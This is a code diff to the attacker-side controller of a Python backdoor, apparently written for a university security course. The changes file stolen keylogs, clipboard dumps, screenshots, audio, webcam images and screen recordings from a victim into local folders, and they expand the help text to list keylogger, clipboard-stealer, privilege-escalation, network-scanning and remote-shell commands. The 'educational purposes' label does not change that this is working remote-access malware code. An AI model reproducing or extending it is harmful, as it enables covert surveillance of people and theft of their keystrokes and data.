@@ -60,7 +60,13 @@ class BackdoorController:
     def download_file(self, file_name):
         """Download a file from the target"""
         try:
-            with open(file_name, 'wb') as f:
+            # Determine the appropriate logs subdirectory based on file type
+            local_file = self._get_local_download_path(file_name)
+            
+            # Create directory if it doesn't exist
+            os.makedirs(os.path.dirname(local_file), exist_ok=True)
+            
+            with open(local_file, 'wb') as f:
                 self.target_socket.settimeout(1)
                 chunk = self.target_socket.recv(1024)
                 while chunk:
@@ -70,9 +76,31 @@ class BackdoorController:
                     except socket.timeout:
                         break
                 self.target_socket.settimeout(None)
-            print(f"[+] File downloaded: {file_name}")
+            print(f"[+] File downloaded: {local_file}")
         except Exception as e:
             print(f"[!] Error downloading file: {e}")
+    
+    def _get_local_download_path(self, remote_file):
+        """Determine the local download path based on remote file path"""
+        # Extract just the filename if it's a full path
+        filename = os.path.basename(remote_file)
+        
+        # Check if the remote file contains a logs/ path structure
+        if 'logs/screenshots' in remote_file or 'screenshot' in filename:
+            return os.path.join('logs', 'screenshots', filename)
+        elif 'logs/audio' in remote_file or (filename.startswith('audio_') and filename.endswith('.wav')):
+            return os.path.join('logs', 'audio', filename)
+        elif 'logs/recordings' in remote_file or 'screen_recording' in filename or 'recording' in filename:
+            return os.path.join('logs', 'recordings', filename)
+        elif 'logs/webcam' in remote_file or 'webcam' in filename:
+            return os.path.join('logs', 'webcam', filename)
+        elif 'logs/keylog' in remote_file or 'keylog' in filename:
+            return os.path.join('logs', 'keylog', filename)
+        elif 'logs/clipboard' in remote_file or 'clipboard' in filename:
+            return os.path.join('logs', 'clipboard', filename)
+        else:
+            # Default: save to current directory
+            return filename
     
     def start_listener(self):
         """Start listening for incoming connections"""
@@ -105,21 +133,19 @@ class BackdoorController:
         ║                  DES484 - SIIT 2024                          ║
         ╚═══════════════════════════════════════════════════════════════╝
 
-        Type 'help' or 'help_advanced' for available commands.
-        Type 'quick' for quick reference of advanced features.
+        Type 'help' for available commands.
         """
         print(banner)
     
     def print_help(self):
-        """Print basic help information"""
+        """Print help information with all commands"""
         help_text = """
         ╔═══════════════════════════════════════════════════════════════╗
-        ║                     BASIC COMMANDS                            ║
+        ║                     AVAILABLE COMMANDS                        ║
         ╚═══════════════════════════════════════════════════════════════╝
 
+        BASIC COMMANDS:
         help                - Show this help message
-        help_advanced       - Show advanced backdoor features
-        quick               - Quick reference for advanced features
         clear               - Clear screen
         sysinfo             - Get system information
         cd <directory>      - Change directory on target
@@ -127,39 +153,55 @@ class BackdoorController:
         upload <file>       - Upload file to target
         quit                - Close connection and exit
 
+        KEYLOGGER:
+        keylog_start        - Start keylogger
+        keylog_stop         - Stop keylogger
+        keylog_dump         - Download keylog file (saved as keylog_dump_TIMESTAMP.txt)
+        keylog_clear        - Clear keylog file
+        keylog_status       - Check keylogger status
+        keylog_manual <text> - Manually log text (fallback mode)
+
+        PRIVILEGE ESCALATION:
+        priv_check          - Check current privileges
+        priv_enum           - Enumerate privilege escalation vectors
+        priv_services       - List running services
+        priv_tasks          - List scheduled tasks
+        priv_sensitive      - Find sensitive files
+
+        SCREEN & MEDIA:
+        screenshot          - Capture single screenshot
+        screenshot_multi <count> <interval> - Capture multiple screenshots
+        screenshot_list     - List captured screenshots
+        audio_record <sec>  - Record audio (default 10 seconds)
+        audio_list          - List audio recordings
+        record_screen <sec> <fps> - Record screen (default 10s, 15fps)
+        record_start <max>  - Start background recording (max duration in seconds)
+        record_stop         - Stop background recording
+        record_status       - Check recording status
+        record_list         - List screen recordings
+        webcam_snap         - Capture webcam image
+
+        NETWORK DISCOVERY:
+        net_info            - Display network information
+        net_scan            - Scan local network for hosts
+        net_connections     - Show active network connections
+        net_portscan <host> - Scan common ports on host
+        net_public_ip       - Get public IP address
+        net_check_internet  - Check internet connectivity
+
+        CLIPBOARD STEALER:
+        clipboard_start     - Start monitoring clipboard
+        clipboard_stop      - Stop monitoring clipboard
+        clipboard_status    - Check clipboard monitor status
+        clipboard_get       - Get current clipboard content
+        clipboard_set <text> - Set clipboard content
+        clipboard_dump      - Download clipboard log file
+        clipboard_clear     - Clear clipboard logs
+        clipboard_list      - List all clipboard log files
+
         Any other command will be executed as a shell command on the target.
-
-        ╔═══════════════════════════════════════════════════════════════╗
-        ║                   ADVANCED FEATURES                           ║
-        ╚═══════════════════════════════════════════════════════════════╝
-
-        For detailed information on advanced features (keylogger, privilege
-        escalation, screen capture, network discovery, persistence), type:
-        
-        help_advanced
         """
         print(help_text)
-    
-    def print_quick_reference(self):
-        """Print quick reference for advanced features"""
-        quick_ref = """
-        ╔═══════════════════════════════════════════════════════════════╗
-        ║                   QUICK REFERENCE                             ║
-        ╚═══════════════════════════════════════════════════════════════╝
-
-        KEYLOGGER:          keylog_start, keylog_stop, keylog_dump
-        PRIVILEGES:         priv_check, priv_enum, priv_services
-        SCREEN:             screenshot, screenshot_multi 5 2, screenshot_list
-        RECORDING:          record_screen 10 15, record_start, record_stop, record_list
-        AUDIO:              audio_record 10, audio_list
-        WEBCAM:             webcam_snap
-        NETWORK:            net_info, net_scan, net_connections, net_portscan, net_public_ip, net_check_internet
-        CLIPBOARD:          clipboard_start, clipboard_stop, clipboard_get, clipboard_dump
-        PERSISTENCE:        persist_install, persist_check, persist_remove
-
-        Type 'help_advanced' for detailed descriptions.
-        """
-        print(quick_ref)
     
     def command_loop(self):
         """Main command loop"""
@@ -174,10 +216,6 @@ class BackdoorController:
                 # Handle local commands
                 if command == 'help':
                     self.print_help()
-                    continue
-                
-                elif command == 'quick':
-                    self.print_quick_reference()
                     continue
                 
                 elif command == 'clear':
@@ -212,7 +250,10 @@ class BackdoorController:
                             remote_file = match.group(1)
                             # Create local filename with timestamp
                             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                            local_file = f'keylog_dump_{timestamp}.txt'
+                            local_file = os.path.join('logs', 'keylog', f'keylog_dump_{timestamp}.txt')
+                            
+                            # Create directory if it doesn't exist
+                            os.makedirs(os.path.dirname(local_file), exist_ok=True)
                             
                             print(f"[*] Downloading keylog file...")
                             try:
@@ -255,7 +296,10 @@ class BackdoorController:
                             remote_file = match.group(1)
                             # Create local filename with timestamp
                             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                            local_file = f'clipboard_dump_{timestamp}.txt'
+                            local_file = os.path.join('logs', 'clipboard', f'clipboard_dump_{timestamp}.txt')
+                            
+                            # Create directory if it doesn't exist
+                            os.makedirs(os.path.dirname(local_file), exist_ok=True)
                             
                             print(f"[*] Downloading clipboard log file...")
                             try:
@@ -333,7 +377,7 @@ class BackdoorController:
 def main():
     """Main entry point"""
     print("=" * 70)
-    print("  Enhanced Backdoor Server - ATTACKER SIDE")
+    print("  Backdoor Server - ATTACKER SIDE")
     print("  This program LISTENS for incoming connections")
     print("  WARNING: For Educational Purposes Only!")
     print("=" * 70)
